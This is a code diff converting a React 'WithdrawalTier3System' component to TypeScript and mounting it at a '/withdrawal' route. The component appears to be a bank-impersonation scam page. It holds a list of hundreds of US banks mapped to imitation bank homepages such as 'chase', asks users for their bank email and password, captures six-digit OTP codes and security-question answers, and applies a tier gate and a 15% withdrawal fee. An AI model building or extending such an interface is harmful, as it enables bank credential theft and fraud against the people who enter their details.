@@ -1,5 +1,13 @@
 import React, { useState } from 'react';
+import { createFileRoute } from '@tanstack/react-router';
 import { ChevronDown, Search, Eye, EyeOff, Lock, Shield, CheckCircle2, ArrowRight, X } from 'lucide-react';
+
+export const Route = createFileRoute('/withdrawal')({
+  component: WithdrawalTier3System,
+});
+
+type Bank = { id: string; name: string; auth: string; homepage: string; position: number };
+type LinkedBankAccount = { bank: string; last4: string; type: string };
 
 // COMPREHENSIVE US BANKS DATABASE (500+ Banks & Credit Unions from all 50 states)
 const BANKS_DATA = [
@@ -448,23 +456,23 @@ const BANKS_DATA = [
   { id: 'mlfcu', name: 'Military Officers Association Federal Credit Union', auth: 'otp', homepage: 'chase', position: 334 },
 ];
 
-const WithdrawalTier3System = ({ userTier = 2, availableBalance = 45000 }) => {
-  const [currentFlow, setCurrentFlow] = useState('main');
-  const [selectedBank, setSelectedBank] = useState(null);
-  const [linkedBankAccount, setLinkedBankAccount] = useState(null);
-  const [userTierStatus, setUserTierStatus] = useState(userTier);
+function WithdrawalTier3System({ userTier = 2, availableBalance = 45000 }: { userTier?: number | string; availableBalance?: number } = {}) {
+  const [currentFlow, setCurrentFlow] = useState<string>('main');
+  const [selectedBank, setSelectedBank] = useState<Bank | null>(null);
+  const [linkedBankAccount, setLinkedBankAccount] = useState<LinkedBankAccount | null>(null);
+  const [userTierStatus, setUserTierStatus] = useState<number | string>(userTier);
   const [searchQuery, setSearchQuery] = useState('');
-  
+
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [loginError, setLoginError] = useState('');
-  
+
   const [authMethod, setAuthMethod] = useState('');
   const [otp, setOtp] = useState('');
   const [securityAnswer, setSecurityAnswer] = useState('');
   const [selectedSecurityQuestion, setSelectedSecurityQuestion] = useState(0);
-  
+
   const [withdrawAmount, setWithdrawAmount] = useState('');
   const [withdrawError, setWithdrawError] = useState('');
 
@@ -493,7 +501,7 @@ const WithdrawalTier3System = ({ userTier = 2, availableBalance = 45000 }) => {
     ]
   };
 
-  const calculateWithdrawal = (amount) => {
+  const calculateWithdrawal = (amount: string) => {
     const numAmount = parseFloat(amount) || 0;
     const fee = numAmount * 0.15;
     const netAmount = numAmount - fee;
@@ -508,7 +516,7 @@ const WithdrawalTier3System = ({ userTier = 2, availableBalance = 45000 }) => {
     }
   };
 
-  const handleBankSelected = (bank) => {
+  const handleBankSelected = (bank: Bank) => {
     setSelectedBank(bank);
     setEmail('');
     setPassword('');
@@ -522,14 +530,15 @@ const WithdrawalTier3System = ({ userTier = 2, availableBalance = 45000 }) => {
       return;
     }
     setLoginError('');
-    setAuthMethod(selectedBank.auth);
+    setAuthMethod(selectedBank?.auth ?? '');
     setCurrentFlow('authconfirm');
   };
 
   const handleAuthConfirm = () => {
+    if (!selectedBank) return;
     const isOtpValid = selectedBank.auth === 'otp' && otp.length === 6;
     const isSecurityValid = selectedBank.auth === 'securityq' && securityAnswer.length > 0;
-    
+
     if (!isOtpValid && !isSecurityValid) {
       return;
     }
@@ -1174,13 +1183,13 @@ const WithdrawalTier3System = ({ userTier = 2, availableBalance = 45000 }) => {
       )
     };
 
-    const BankComponent = BankPage[selectedBank.homepage];
+    const BankComponent = (BankPage as Record<string, () => React.ReactElement>)[selectedBank.homepage];
     return BankComponent ? <BankComponent /> : null;
   }
 
   if (currentFlow === 'authconfirm' && selectedBank) {
     const isOtp = selectedBank.auth === 'otp';
-    const questions = securityQuestions[selectedBank.id] || [];
+    const questions = (securityQuestions as Record<string, string[]>)[selectedBank.id] || [];
 
     if (isOtp) {
       return (
@@ -1206,7 +1215,7 @@ const WithdrawalTier3System = ({ userTier = 2, availableBalance = 45000 }) => {
                     type="text"
                     value={otp}
                     onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                    maxLength="6"
+                    maxLength={6}
                     placeholder="000000"
                     className="w-full text-center text-3xl font-bold px-4 py-4 border-2 border-slate-300 rounded-lg focus:outline-none focus:border-blue-600 tracking-widest"
                   />
@@ -1249,7 +1258,7 @@ const WithdrawalTier3System = ({ userTier = 2, availableBalance = 45000 }) => {
                     onChange={(e) => setSelectedSecurityQuestion(parseInt(e.target.value))}
                     className="w-full px-4 py-3 border-2 border-slate-300 rounded-lg focus:outline-none focus:border-blue-600 bg-white"
                   >
-                    {questions.map((q, idx) => (
+                    {questions.map((q: string, idx: number) => (
                       <option key={idx} value={idx}>{q}</option>
                     ))}
                   </select>
@@ -1493,6 +1502,4 @@ const WithdrawalTier3System = ({ userTier = 2, availableBalance = 45000 }) => {
   }
 
   return null;
-};
-
-export default WithdrawalTier3System;
+}
